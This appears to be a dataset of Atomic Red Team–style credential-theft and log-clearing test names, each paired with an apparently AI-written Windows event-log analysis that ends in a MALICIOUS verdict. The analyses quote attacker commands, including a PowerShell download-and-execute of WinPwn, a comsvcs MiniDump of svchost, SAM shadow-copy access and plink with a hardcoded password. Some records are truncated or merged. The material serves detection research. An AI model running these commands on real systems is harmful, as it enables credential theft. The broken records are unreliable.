   - Change passwords for all accounts accessed on this machine, and review access logs for any abnormal access attempts.

4. **Strengthen Security Posture:**
   - Implement enhanced logging with monitoring to detect and alert on anomalous activities like log clearing and the usage of tools like `hashcat.exe`.

5. **Report and Documentation:**
   - Document the incident thoroughly and report to management and relevant stakeholders as per the organization's incident response policy.

These steps should help contain the potential threat and guide actions necessary for a thorough resolution and prevention of future incidents."
Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos),"Upon analyzing the provided logs, several events stand out that indicate potential malicious activity. Below is a detailed analysis of the suspicious activities observed in the logs:

1. **Event Log Clearing**:
   - Multiple entries in the System and Security logs show ""LogFileCleared"" events (Event ID 104 for System and Event ID 1102 for Security). These are associated with the user ""admin_test"". Log clearance can often be a sign of malicious activity, as attackers frequently clear logs to cover their tracks after performing illicit actions.

2. **Suspicious PowerShell Activity**:
   - The Sysmon and Windows PowerShell logs reveal the execution of PowerShell with detailed command lines indicative of a password spraying attack. The command outlines attempts to authenticate using a known password across multiple domain accounts to discover valid credentials. This behavior is highly indicative of malicious activity, particularly given the presence of potentially opportunistic NTLM authentication abuse.

3. **Unusual High Integrity Level Processes**:
   - The Sysmon logs reveal multiple instances where administrative-level processes are being executed by ""admin_test"". The processes include `wevtutil.exe`, which is used to manage Windows event logs, and shows that several clearing events executed by this user further reinforce the potential malicious intent to cover traces.

4. **Time Manipulation Events**:
   - Event log entries show time adjustments (Event ID 4616) executed by local services. While this in itself might not be directly malicious, when combined with the aforementioned activities, it might suggest tampering to disrupt timestamps for audit logs.

### Conclusion

Based on the evidence of:
- Clear logs and the erasure of event logs aimed at concealing actions,
- Execution of potential credential brute-forcing through automated PowerShell scripts,
- And high-integrity process executions correlating with log clearance actions,

The activities observed in these logs can confidently be identified as indicative of malicious intent.

### Resolution: MALICIOUS

### Guidance and Next Steps:
- Immediate containment actions should be implemented to prevent further unauthorized access and potential data exfiltration from ""Server002"".
- Conduct a forensic analysis of ""Server002"" to understand the extent of the compromise.
- Reset all potentially compromised accounts, especially ""admin_test"", and ensure complex password policies are enforced.
- Deploy enhanced monitoring and alerting mechanisms for suspicious activities, focusing on PowerShell execution and changes to log files.
- Review and implement security patches and configurations to mitigate future vulnerabilities exploited by attackers."
dump volume shadow copy hives with certutil,"**Analysis of the Logs:**

1. **Event Log Clearing Attempts:**
   - There are multiple instances of the `wevtutil.exe` utility being run to clear log files for different channels, such as `System`, `Security`, and `Windows PowerShell`. This is observed in the Security, System, and Sysmon logs. Events with IDs 104 and 1102 indicate logs being cleared by the user `admin_test`. This action is generally associated with malicious activities, as attackers often try to hide traces of their activities.

2. **Suspicious Command Execution:**
   - The command execution involving `certutil.exe` observed in the Sysmon log is highly indicative of malicious activity. The command attempts to access shadow copies of the Windows registry hive files (e.g., `SAM`). This is a known technique used for extracting sensitive information, such as password hashes. The command utilizes `certutil` for file operations, which is a well-known living-off-the-land binary (LoLBas) used by attackers for malicious purposes. The parent process is `cmd.exe` with a looping command structure, further suggesting nefarious intent.

3. **Process Execution and High Integrity Level:**
   - Processes like `wevtutil.exe`, `whoami.exe`, `cmd.exe`, and `conhost.exe` are run with high integrity levels under the `admin_test` user. While some of these processes may be legitimate, their sequence and context here suggest attempts to enumerate information (`whoami`) and cover tracks (`wevtutil`).

4. **Unusual Parent-Child Process Relationships:**
   - The logs show the `cmd.exe` process invoking `certutil.exe`, indicative of a scripted or premeditated sequence of actions. This chain is suspicious because it involves accessing volume shadow copies, likely to extract registry hives for offline analysis or data theft.

5. **Software Protection Platform Events:**
   - The `Microsoft-Windows-Security-SPP` events seem routine for software protection and licensing and do not appear directly related to malicious activity in this context.

6. **Microsoft EdgeUpdate Process:**
   - The execution related to Microsoft Edge appears to be legitimate software updating and not directly linked to the identified malicious activity.

**Threats or Risks Identified:**
- The clearing of log files and the usage of `certutil.exe` and `cmd.exe` with the specific command pattern strongly suggest malicious activity aimed at extracting sensitive information and covering tracks.
- The identified behavior aligns with known TTPs (Tactics, Techniques, and Procedures) of attackers attempting to perform privilege escalation, lateral movement, or data exfiltration.

**Guidance on How to Proceed:**
- **Immediate Response:**
  - Isolate the affected host to prevent any further potential data exfiltration or lateral movement within the network.
  - Conduct a comprehensive forensic investigation on the host to recover any logs or data that may have been tampered with or deleted.
  - Verify any unauthorized accesses and potential data breaches, focusing on extracted files if accessible.

- **Containment:**
  - Review user privileges and enforce the principle of least privilege to prevent similar incidents.
  - Disable the `admin_test` account if it is not supposed to perform such administrative actions or was compromised.

- **Eradication and Recovery:**
  - Remove any discovered malicious artifacts and backdoor access points.
  - Retain evidence for potential legal proceedings or further investigations.
  - Restore the system from a known good backup if necessary.

- **Preventive Measures:**
  - Implement stricter monitoring and alerting for sensitive operations such as log clearing, volume shadow copy access, and usage of `certutil`.
  - Employee security awareness training should be conducted to prevent future compromises.

**Resolution:**
- **MALICIOUS** - The logs contain definitive indicators of malicious activity, characterized by suspicious log clearing, unauthorized access attempts, and potential data extraction. Immediate action is required to mitigate the threat."
Dump Credential Manager using keymgr.dll and rundll32.exe,"### Analysis of the Logs:

   - Multiple instances of event logs being cleared (`EventID: 104` and `EventID: 1102`), specifically `System`, `Security`, and `Windows PowerShell` logs cleared at `2024-10-20 17:20:41.8784880`.
   - This activity was carried out by a user with the username `admin_test`.

2. **Privilege Escalation and High Privileges**:
   - `EventID: 4672` indicates that `admin_test` held significant privileges like `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, which are powerful privileges typically indicative of administrative rights or potential privilege escalation activities.
   - There are two instances of `EventID: 4624` indicating an NTLM logon from a remote IP address, which might be suspicious if not from a known and trusted source. IP addresses logged are `fe80::9dcf:4519:45e7:eba2` and `fe80::e3b5:5371:12a8:9c77`.

3. **Execution of Suspicious Commands**:
   - Sysmon logs show the execution of `wevtutil.exe` to clear logs with the syntax `wevtutil.exe cl`, which clearly correlates with the clearing of logs.
   - `powershell.exe` ran a `rundll32.exe keymgr,KRShowKeyMgr` command, a known technique often abused in malicious activities to enumerate or manage saved credentials.

4. **Process Executions and Network Connections**:
   - Several `ProcessCreate` events in Sysmon logs indicative of various Windows utilities being run (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`), potentially indicating reconnaissance or system enumeration activities.

5. **Abnormal User Activity**:
   - Activity by user `admin_test` across multiple system utilities in rapid succession and associated event log clearing is highly suspicious.

#### Assessment:
The logs indicate potentially malicious activity. The clearing of event logs by the user `admin_test`, multiple executions of a utility involved in credential management, and high privilege actions strongly suggest an attempt to cover tracks and possibly escalate privileges or conduct reconnaissance. The execution of high-privileged operations and logon events especially raise concern given the close timing and nature of operations executed.

Based on the evidence, this activity could likely be an insider threat or an unauthorized use of an admin account, potentially a compromised account.

### Resolution:
**MALICIOUS**: The logs demonstrate behavior consistent with malicious activity, with evidence pointing towards efforts to cover tracks by an individual with high privileges, potential credential manipulation, and unnecessary log clearance. Immediate investigation and response are advised.

### Guidance on How to Proceed:
- **Containment**: Restrict the access of the user `admin_test` and review any active sessions. Change credentials and enforce MFA if not already in place.
- **Forensic Analysis**: Conduct a detailed forensic investigation to trace the source and scope of the intrusion. Review system image, memory dumps, and any available network logs.
- **Monitoring**: Implement enhanced monitoring of log files and administrative accounts. Consider employing more advanced threat detection solutions.

- The use of `AtomicRedTeam` framework indicates either a controlled penetration test or a security breach simulation, yet without explicit context or approval, this activity could be unauthorized and malicious.

### Resolution:
**MALICIOUS**

### Recommendations:
- **Immediate Action Required:**
  - Investigate the user account `admin_test` for any anomalies or unauthorized access.
  - Review system access and validate if actions were part of authorized penetration testing or cybersecurity exercises.
  - Implement additional monitoring on the network and host to detect further unauthorized activities.
  - Isolate the system to avoid potential lateral movement within the network.
  
- **Preventive Measures:**
  - Consider restricting the ability to clear event logs to a smaller group of trusted administrative users.
  - Deploy endpoint detection and response (EDR) solutions to monitor and block the execution of known malicious tools like `pypykatz`.
  - Conduct a full security audit to ensure no persistence mechanisms were installed by the potential attacker.
  
These actions should help to secure the system and provide a clearer understanding of whether this activity was malicious in nature or part of a sanctioned cybersecurity exercise."
Create Volume Shadow Copy with diskshadow,"Upon reviewing the provided logs, several indicators of suspicious and potentially malicious activities are noted. Here is a detailed breakdown of the findings:

1. **Clearing of Event Logs**: 
   - Event ID 1102, 104 in the Security and System logs suggest that the event logs have been cleared. This action was performed by the user `admin_test`, indicating potentially malicious activity, as clearing logs is often an attempt to cover tracks on compromised systems.

2. **Privileged Logon and Privilege Use**:
   - Event ID 4672 shows that `admin_test` logged in with a set of privileges that include `SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege`, and others. The presence of these privileges can indicate an attempt at privilege escalation or misuse.

3. **Logon from a Different Machine**:
   - Event ID 4624 indicates a logon from IP `192.168.0.102` using the `NTLM` authentication. This could suggest lateral movement within a network, especially given the user is `admin_test`.

4. **Use of `wevtutil.exe`**:
   - Sysmon logs show repeated use of `wevtutil.exe` by the `admin_test` user to clear logs in various channels (`System`, `Security`, and `Windows PowerShell`). This utility is frequently used for administering event logs but can also be used to clear logs as observed here.

5. **Unusual Command Execution**:
   - The command line `\""cmd.exe\"" /c mkdir c:\\exfil & diskshadow.exe /s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1003.003\\src\\diskshadow.txt` is highly suspicious. It attempts to create a directory `c:\exfil`, which could be indicative of data exfiltration preparations, and uses `diskshadow.exe`, which may be used for shadow copy manipulation as part of credential-dumping techniques.

6. **Use of `whoami.exe` and `hostname.exe`**:
   - These utilities were executed, possibly as part of reconnaissance activities to gain information about the user context and system hostnames.

Given the combination of event log clearing, suspicious commands, the use of credential and log manipulation utilities, and the presence of multiple high privileges, there are strong indicators of a security compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate the affected host (Server002) to prevent further unauthorized activity.
- Conduct a thorough forensic analysis to identify the scope and impact of the compromise, including potential data exfiltration.
- Review other systems within the network for similar activities, especially from the suspicious IP address.
- Evaluate `admin_test` account for the legitimacy of its activities, and consider credential reset or account disabling.
- Enhance logging and monitoring across the environment to detect similar patterns early.
- Educate users about security best practices, especially concerning the dangers of privilege escalation and unusual remote logins."
ESXi - Brute Force Until Account Lockout,"After reviewing the provided Windows event logs, several aspects are indicators of potential malicious activity:

1. **PowerShell Execution**: The logs show multiple instances of PowerShell launching with a specific command line that includes an execution of `plink.exe`, which is a command-line utility typically used for SSH connections (seen in the Sysmon and PowerShell logs). The command is designed to connect to `atomic.local` using root credentials and a hardcoded password (`f0b443ae-9565-11ee-b9d1-0242ac120002`). This behavior is suspicious and indicative of attempts to create unauthorized connections to another server or system.

2. **Log Clearing**: The logs include multiple ""LogFileCleared"" events for the System and Windows PowerShell logs (as observed in the Sysmon and System logs). This could suggest an attempt to cover tracks, a common tactic following unauthorized or malicious activity.

3. **Sysmon Logging of `wevtutil.exe`**: The execution of `wevtutil.exe` to clear event logs (via the `cl` command with EventID 1 logs) further supports the notion that an attempt was made to conceal activities.

4. **High Integrity Level Processes**: Processes involving `wevtutil.exe` and `PowerShell.exe` are running at a high integrity level, which suggests that an elevated user was making these processes and attempts.

5. **Repeat Execution of Plink**: The continuous execution of `plink.exe` following the PowerShell script calls indicates repeated attempts to connect, which should be investigated further.

6. **Unusual Process Parentage**: Noteworthy is the `PowerShell.exe` initiating `plink.exe` from a temp directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\ExternalPayloads\\plink.exe`), which is often suspicious when seen outside regular maintenance tasks.

Given the combination of unauthorized SSH attempts, usage of high privilege levels, and clearing of event logs, these activities collectively suggest malicious intent.

**Final Assessment**: MALICIOUS

**Recommendation**:
- Immediately isolate the affected machine (""Server002"") to prevent any further unauthorized access or data exfiltration.
- Conduct a thorough investigation to uncover the full scope of the breach, including network logs and other hosts' connections.
- Reset credentials, especially those with administrative privileges that might have been compromised.
- Review and strengthen access controls and monitoring to detect any future unauthorized access attempts."
WinPwn - powershellsensitive,"Upon analyzing the provided Windows event logs, here is a breakdown of suspicious and potentially malicious activities:

1. **Application Log**:
   - The logs indicate that Windows Defender is active and shows entries related to the Software Protection Platform. These logs do not indicate suspicious activity.

2. **System Log**:
   - The logs show multiple instances of event logs being cleared (Event ID 104) for the System and Windows PowerShell channels by a user named `admin_test`. This is a notable action possibly indicating an attempt to hide malicious activities, as log clearing is a tactic often used by attackers post-compromise.
   - Time change events are logged (Event ID 24 and 1), which show adjustments to the system clock. While not inherently malicious, time manipulation can be used to obfuscate timeline analysis.

3. **Security Log**:
   - Similar to the system logs, the security log was cleared (Event ID 1102). This action is carried out by the same user `admin_test`, reinforcing suspicion regarding potential malicious activity.
   - Time change events (Event ID 4616) mirror those found in the system logs.

4. **Windows PowerShell Log**:
   - There are events indicating the execution of PowerShell scripts that download content from GitHub (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). The use of `iex(new-object net.webclient).downloadstring()` is a common technique used by attackers to execute malicious code from remote locations.
   - The specific script from the URL is intended for penetration testing and is potentially harmful if executed in an unintended environment.

5. **Sysmon Log**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are observed in high-integrity contexts with command-line parameters clearing event logs, aligning with observations in the System and Security logs. This confirms the log-clearing activity.
   - The use of `whoami.exe` and `hostname.exe` can be routine if used for legitimate purposes, but combined with the above actions, these might be part of a discovery process by an intruder.
   - The execution of `powershell.exe` with malicious scripts is corroborated by the Sysmon logs, echoing the suspicious PowerShell activity noted earlier.

### Assessment

The logs indicate probable malicious activity. The clearing of multiple event logs by the same `admin_test` user, along with the evidence of PowerShell downloading and potentially executing scripts from an external source, strongly suggests compromise.

### Conclusion: MALICIOUS

### Recommendations:
- **Immediate Remediation**: Conduct an incident response to verify the extent of the compromise. This may include isolating the affected machine, forensic examination of user `admin_test`, as well as broader network-wide checks for similar patterns.
- **Review Credentials**: Investigate the `admin_test` user account for unauthorized/logged actions and possible credential compromise. Consider privilege reset or removal of this account.
- **Block and Review**: Network egress filtering needs review to block unauthorized downloads and execute the process at the endpoint. Alert on PowerShell usage that retrieves scripts from the internet.
- **Enhance Monitoring**: Adjust monitoring policies to identify anomalous behavior like log clearing, unauthorized time changes, and unsigned or untrusted script execution.
- **Patch and Update Systems**: Ensure all systems are up-to-date with patches to protect against exploited vulnerabilities.
- **Conduct a Full Threat Hunt**: Assess other systems beyond the initial host to ensure the activity has not propagated or affected other hosts in the network."

WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS,"After analyzing the provided logs, the following key points were identified that indicate suspicious and potentially malicious activity:

### Suspicious or Anomalous Behavior:
1. **Event Log Deletion**: 
   - Multiple events (EventID 1102 in the Security log and EventID 104 in the System log) indicate that logs have been cleared by the user `admin_test`. Clearing event logs is a significant red flag as it is commonly associated with attempts to cover tracks post-compromise or unauthorized activities.

2. **Time Manipulation**: 
   - Security EventID 4616 shows evidence of time manipulation (`OldTime` and `NewTime` values). Time changes can be part of attempts to mislead system monitoring and logs.

3. **PowerShell Activity**:
   - Evidence of potentially malicious PowerShell activity with scripts being executed from the URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1`. This script is known for privilege escalation and credential dumping tactics.

4. **Use of `wevtutil`**: 
   - Various Sysmon events show the usage of the `wevtutil` command to clear logs. This is unusual and potentially malicious behavior as it can be used to delete or export event logs, further corroborating attempts to hide malicious activities.

5. **Administrative Privileges and Network Connections**:
   - The account `admin_test` has been observed using high integrity level processes with many administrative privileges (`SeSecurityPrivilege, SeBackupPrivilege, etc.`). Coupled with suspicious network-related PowerShell activity, this suggests possible exploitation.

6. **Multiple `svchost.exe` and `sppsvc.exe` Invocations**:
   - Although usually benign, in conjunction with the other suspicious activities, repeated invocations of these services can sometimes be indicative of a process injection or persistence mechanism being abused.

### Assessment:
Based on the above behavior, there is clear evidence that malicious activities have taken place on this host. The consistent theme of log manipulation, suspicious scripting activities via PowerShell, and use of administrative tools like `wevtutil` with dubious purpose aligns with tactics, techniques, and procedures (TTPs) associated with malicious actors trying to maintain persistence and avoid detection.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Containment**:
   - Isolate the affected host from the network to prevent further lateral movement or data exfiltration.

2. **In-depth Investigation**:

WinPwn - sensitivefiles,"**Detailed Analysis of Logs:**

1. **Process Execution and Command-Line Analysis:**
   - Throughout the Sysmon logs, a number of processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are executed by the user `SERVER002\admin_test`. These processes, specifically `wevtutil.exe` with command-line arguments to clear logs (e.g., `wevtutil.exe cl Application`), suggest an attempt to clear event logs, which is often indicative of an attacker trying to cover their tracks after malicious actions.
   - A significant red flag is the execution of `powershell.exe` with a command to download and execute a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This script likely attempts to perform unauthorized actions, indicating a PowerShell-based attack.
   - The presence of commands targeting retrieving sensitive files (`sensitivefiles -noninteractive -consoleoutput`) during this PowerShell execution is indicative of data exfiltration attempts.

2. **Security and System Logs:**
   - Event ID 1102 in the Security log shows the security event log was cleared by the user `admin_test`. Combined with the clearing of the Application, System, and Windows PowerShell logs observed in System log EventID 104, this indicates clear signs of an attempt to remove traces of activity.

3. **Other Indicators:**
   - The consistent usage of high-integrity level processes and their execution under administrative credentials might suggest privilege escalation tactics or the usage of already escalated privileges.
   - Event ID 4616 in the Security log indicates time manipulation attempts, often used to confuse incident response efforts or circumvent security logs with incorrect timestamps.

4. **Network Activity:**
   - There are no explicit packet analysis logs or network activity logs, but download and execution from the internet using PowerShell indicates potential remote command executions and external communication unnoticed by perimeter security.

**Assessment of Situation:**

The combination of cleared logs, high-integrity processes to cover tracks, PowerShell activity downloading and executing potential attack scripts, and the execution of `wevtutil.exe` commands to clear logs strongly indicate malicious behavior. These activities align with techniques used in a post-compromise scenario to achieve persistence, data exfiltration, or lateral movement.

**Resolution:**
- **MALICIOUS**: The logs exhibit clear malicious activity.

Request All Tickets via PowerShell,"Upon examination of the logs provided, several indicators suggest suspicious and potentially malicious activities:

1. **Log Clearing Activity**:
   - The System log shows two instances (`EventID 104`) of log clearing by the user `admin_test`. The logs cleared were from the System and Windows PowerShell channels. Similarly, the Security log (`EventID 1102`) was cleared as well. Log clearing can often be a sign of malicious activity as it suggests an attempt to cover tracks.

2. **Command-line Activity**:
   - There are multiple executions of `wevtutil.exe` with the `cl` option, clearing logs from different channels such as Microsoft-Windows-Sysmon/Operational and Application. This is unusual and reinforces the suspicion around log clearing and tampering.

3. **PowerShell Activity**:
   - Executions involving PowerShell with complex command lines including usage of `Set-Spn` and instantiating a `KerberosRequestorSecurityToken`. This type of activity might relate to credential gathering or attempting privilege escalation, particularly due to the construction and use of the `New-Object` and `Add-Type` cmdlets in the script which appears crafted to manipulate Kerberos tokens.

4. **High Integrity Level Executions**:
   - Multiple processes such as PowerShell and `wevtutil.exe` were run with high integrity levels which often implies administrative privileges, intensifying the concern about privilege escalation attempts or malicious use.

5. **EdgeUpdate Activity**:
   - There are multiple instances of `MicrosoftEdgeUpdate.exe` running with variations in command-line arguments. While its presence isn't inherently malicious, its repetitive invocation alongside other suspicious activities could indicate either tampering with scheduled tasks or a possible technique for persistence or lateral movement.

Given these indicators, the conclusion drawn from the logs is that there are strong signs of malicious activities aimed at possibly persisting undetected or exfiltrating credentials. There is clear evidence of log manipulation, unauthorized PowerShell use, and suspicious process executions. 

**Resolution**: MALICIOUS

**Guidance**:
- Conduct a thorough investigation on the user account `admin_test` and inspect any associated access logs.
- Perform a system-wide integrity review and look for indicators of compromise beyond logs.
- Ensure immediate containment and incident response actions, such as isolating the affected host(s) and conducting a forensic analysis to understand the extent of the intrusion.
- Reinforce logging mechanisms and monitor for any further unauthorized access attempts.
- Engage with IT and cybersecurity teams to review and possibly update security protocols and access controls."
Dump svchost.exe to gather RDP credentials,"Upon analyzing the provided Windows event logs, the following insights point towards potential suspicious activity:

1. **Windows PowerShell Activity**: The logs indicate that PowerShell commands are being executed to perform advanced operations involving process identification and memory dumping.
   - The `Get-NetTCPConnection` command is used to check for established connections on port 3389, which is the default port for Remote Desktop Protocol (RDP). This may suggest reconnaissance or monitoring of RDP connections.
   - The subsequent use of `rundll32.exe` to execute `comsvcs.dll` with `MiniDump` to create a memory dump of a process (`svchost`) is highly atypical for regular usage. This technique is often used for malicious activities, such as credential theft or reverse engineering.

2. **Security Log Events**:
   - Event ID 1102 shows log clearing activity initiated by the user `admin_test`. Clearing logs can be indicative of a user attempting to cover their tracks post-compromise.
   - Privilege escalation incidents are documented (Event ID 4672), where the user `admin_test` is granted high-level privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are unnecessary for regular user activity and often leveraged for system-level compromises.

3. **Sysmon Log Entries**:
   - `wevtutil.exe` is used frequently, indicating the clearing of several logs, including Sysmon/Operational, Application, and Security logs. Such activity is consistent with malicious behavior aimed at hiding activity trails.
   - The `rundll32.exe` execution with suspicious parameters matches the PowerShell activity and corroborates potential illicit activity described previously.

4. **System Log Events**:
   - Events showing log clearance correlate with the Sysmon logs, indicating this was a deliberate action taken by `admin_test`. The clearing of Windows event logs without a proper change request or justification can be perceived as an attempt to hide evidence of unauthorized or malicious activities.

### Assessment:
The combination of PowerShell script execution involving network reconnaissance and process dumping, significant privilege usage, systematic clearing of event logs, and the unusual frequency of these activities collectively suggest indicators of malicious intentions.

### Conclusion: MALICIOUS

The pattern and nature of activities strongly indicate a security incident with malicious intent, possibly involving compromise activities, attempted credential theft, and subsequent efforts to hide tracks.

### Recommendations:
- Immediately escalate this finding to the incident response team for further investigation.
- Consider isolating the compromised host (`Server002`) from the network to prevent further unauthorized access.
- Conduct a thorough forensic investigation to assess the full extent of the compromise and identify affected accounts or systems.
- Review account `admin_test`'s activities and credentials, as it is heavily involved in the suspicious activities, and reset passwords or revoke access as necessary.
- Implement monitoring and detection for similar activities in the future and consider reinforcing PowerShell execution policies and logging configurations."
Export Root Certificate with Export-Certificate,"Upon analyzing the provided Windows event logs, several indications of suspicious behavior are evident:

1. **Clearing of Event Logs**: 
   - The `Security`, `System`, and `Windows PowerShell` event logs were cleared by the user `admin_test`. This is indicative of malicious activity as attackers often clear logs to remove traces of their presence and activities on the compromised system. These activities are captured in Event IDs 1102 (Security log cleared) and 104 (System log cleared).

2. **Suspicious PowerShell Command Execution**:
   - There is a PowerShell command executed to create a self-signed certificate and export it, which is a behavior often associated with persistence mechanisms or setup for further activities (Event ID 17979 in Sysmon log and corroborated in PowerShell logs). The command was executed by the user `admin_test`.

3. **Privilege Escalation Indicators**:
   - Event ID 4672 shows the user `admin_test` obtained privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. These privileges can be leveraged by attackers to perform sensitive operations on the system.

4. **Time Manipulation**:
   - A suspicious time change was recorded (Event IDs 4616 in Security log and 1 in System log). This could be an attempt to confuse event log chronological order for obscuring the timeline of events.

Overall, the combination of event log clearing, suspicious PowerShell activity, privilege escalation, and time manipulation strongly suggests the possibility of a compromise. The logs reflect activities that are consistent with malicious behavior.

Resolution: **MALICIOUS**

**Guidance on how to proceed**:

Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials],"Based on the logs provided, several concerns suggest suspicious or potentially malicious activity. Here’s a breakdown of the findings:

1. **Event Log Clearing**: 
   - **System Log**: Events 104 in the System and Windows PowerShell logs indicating logs have been cleared. 
   - **Security Log**: Event 1102 indicating the security log was cleared by the user ""admin_test"".
   - These activities are often an indicator of malicious intent, as attackers frequently clear logs to cover their tracks after a compromise.

2. **Unusual PowerShell Activity**: 
   - In the PowerShell logs, there is evidence of a command executed to list credentials using `vaultcmd /listcreds:""Windows Credentials"" /all`. This behavior is suspicious because listing credentials without a clear administrative or operational purpose often aligns with reconnaissance activities by an attacker to gather sensitive information.

3. **Process Execution - Sysmon Logs**:
   - **Wevtutil for Clearing Logs**: Several entries show the use of `wevtutil.exe` to clear event logs systematically across the System, Security, and Windows PowerShell channels. This aligns with the event log clearing mentioned above.
   - **High Privilege Processes**: Many of these processes (including PowerShell) are running at a high integrity level, suggesting administrative privileges, which if not authorized appropriately, can indicate an attempt at privilege escalation or misuse.
   
4. **Credential Enumeration**:
   - The use of `VaultCmd.exe` to list credentials is notable. This command is not typical for legitimate user activity and often indicates an attempt to harvest stored credentials.

5. **Time Synchronization Events**:
   - There are events related to time change (EventID 4616), which could suggest tampering with system time in an attempt to confuse time-based log entries. However, this could also be normal system behavior if driven by legitimate time synchronization processes.

6. **Edge Update Processes**:
   - There are numerous entries related to Microsoft Edge Update processes. While Edge updating itself isn’t inherently suspicious, the timing and context are suspect, especially if combined with the clearing of logs around the same time.

ADFS token signing and encryption certificates theft - Local,"Upon review of the given logs from the Windows host, the following analysis identifies certain suspicious activities that warrant deeper investigation.

### Suspicious and Anomalous Behavior:

1. **Event Log Clearing**: The security event log shows the event ID 1102 which indicates the security log was cleared. This activity, executed by the user **SERVER002\\admin_test**, suggests an attempt to cover tracks, as it is unusual to clear event logs without legitimate administrative need or reason.

2. **Use of PowerShell for Potentially Malicious Tasks**: 
    - The PowerShell logs indicate execution of a script involving **AADInternals**, a module known to be used for interacting with Azure Active Directory, which could be benign or malicious depending on context. The script involved commands like `Export-AADIntADFSCertificates`, which might be used for extracting sensitive certificate information related to ADFS (Active Directory Federation Services).
    - This script execution was recorded at a similar time to the log clearance events, which adds to the suspicion, suggesting these actions might be linked.

3. **Use of `wevtutil.exe` for Log Clearing**:
    - The Sysmon logs show multiple uses of the `wevtutil.exe` command with the `cl` (clear) parameter to clear logs (`Application`, `System`, and `Security` logs) by the same `admin_test` user. Normally, such operations are not carried out in rapid succession and are uncommon in typical administrative tasks.

4. **Installation of Microsoft Edge Update**: 
    - The Sysmon log entries show background activity involving update installation processes related to Microsoft Edge, running under NT AUTHORITY\SYSTEM, which is generally legitimate. However, this may indicate a smokescreen event if determined atypical in the context of the user's behavior patterns.

5. **Process Execution by `admin_test` User**:
    - There is a consistent pattern of different Windows utility executions (e.g., `hostname.exe`, `whoami.exe`) around the same timestamps as event log clearances. This could be a tool usage pattern to verify system information during potentially unauthorized activities.

### Assessment and Guidance:
The indicators, such as event log clearing and use of PowerShell scripts for potential certificate export involving ADFS, suggest a high chance of malicious activity, likely involving credential or certificate theft. The actions were executed with high integrity levels, leveraging administrative privileges, which increases the risk profile.

Resolution: **MALICIOUS**

### Recommended Actions:
1. **Immediate Containment**: Restrict or revoke the permissions of the user account involved (SERVER002\admin_test) and any related accounts.
2. **Thorough Review**: Conduct a comprehensive forensic review of the affected system, focusing on any lateral movement, data exfiltration, or similar malicious patterns.
3. **Audit and Monitor**: Implement continuous auditing and advanced monitoring for further suspicious behavior in the environment, particularly related to PowerShell and event log activities.
4. **Security Hardening**: Review and apply security hardening configurations, use least privilege principles, and consider enhanced logging for critical systems and privileged operations.
5. **Notify Security Teams**: Inform all relevant stakeholders, including incident response and security operations teams, to ensure rapid response and further analysis."
Dump credentials from Windows Credential Manager With PowerShell [windows Credentials],"Based on the analysis of the provided Windows event logs, the following points of interest and evidence suggestive of malicious activity have been identified:

1. **Log Clearing Activity:**
   - There are multiple events indicating that logs were cleared. Specifically, the Security log was cleared at `2024-10-27 21:00:52.2964429`, and the System log was cleared shortly after at `2024-10-27 21:00:52.2425957` and the Windows PowerShell log at `2024-10-27 21:00:52.3638218`. The clearing of logs can be an indication of an attempt to cover up malicious activity.

2. **Execution of Suspicious PowerShell Script:**
   - A command was executed via PowerShell to download and execute a script from a GitHub repository (`https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1`). This script is designed to extract credentials from the Windows Credential Manager, indicating a high likelihood of credential theft.

3. **Unusual System and User Behavior:**
   - The `wevtutil.exe` command was frequently executed to clear various event logs, which is another strong sign of malicious behavior.
   - The `whoami.exe` and `hostname.exe` commands were executed, which can be used by an attacker to gather system and user information as part of a reconnaissance process.

4. **Tampering with System Time:**
   - There were events indicating changes to the system time (`EventID: 4616`). While time synchronization changes can be normal, frequent or unauthorized time changes could be leveraged by an attacker to manipulate timestamp-based logs or processes.

5. **Process Anomalies:**
   - The high integrity level of the processes involved and the command-line arguments used with PowerShell are atypical for ordinary scripts, suggesting a bypass of security controls could be attempted.

**Threat Assessment:**
The logs exhibit clear indicators of compromise, including evidence of an attacker executing a potentially malicious PowerShell script aimed at credential theft, efforts to cover tracks by clearing logs, and collecting system and user information.

**Resolution: MALICIOUS**
Given the presence of these indicators, it is highly likely that the system has been compromised by a sophisticated attacker. Immediate steps should be taken to:
- Isolate the system to prevent further spread or damage.
- Conduct a thorough forensic investigation to assess the extent of the breach and identify any additional compromised systems.
- Review and restore system security measures, including verifying the integrity and security of critical files and resetting potentially compromised credentials.
- Report the incident following organizational policy and possibly coordinate with law enforcement if necessary."
Password Spray Invoke-DomainPasswordSpray Light,"Upon reviewing the provided Windows event logs, several events strongly indicate suspicious and potentially malicious activities:

1. **PowerShell Script Execution**:
   - The logs show the execution of a PowerShell script with a function ""Invoke-dpsLight"" which attempts to check user passwords against the Active Directory. This script iterates over a list of users and attempts login using a hardcoded password. The presence of such a password spraying tool is a clear indication of malicious intent or unauthorized activities.

2. **Clearing of Windows Event Logs**:
   - There are multiple logs, specifically Event ID 104 for System, Security, and PowerShell logs, indicating that these event logs have been cleared by the user 'admin_test'. This action often accompanies malicious activities to cover tracks and is a major red flag in any security investigation.

3. **High Integrity Processes by 'admin_test' User**:
